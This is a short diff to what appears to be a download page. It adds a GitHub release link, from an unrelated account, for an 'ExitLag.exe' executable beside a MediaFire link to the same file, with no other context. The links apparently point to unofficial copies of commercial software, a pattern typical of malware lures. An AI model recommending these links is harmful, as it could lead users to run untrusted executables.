@@ -1,6 +1,6 @@
 Download =====> 
 
-"1" 
+"1" https://github.com/weebforlans/ExitLag/releases/download/ExitLag/ExitLag.exe
 
 "2" https://www.mediafire.com/file/ggijsgd9roce4fe/ExitLag.exe/file
 
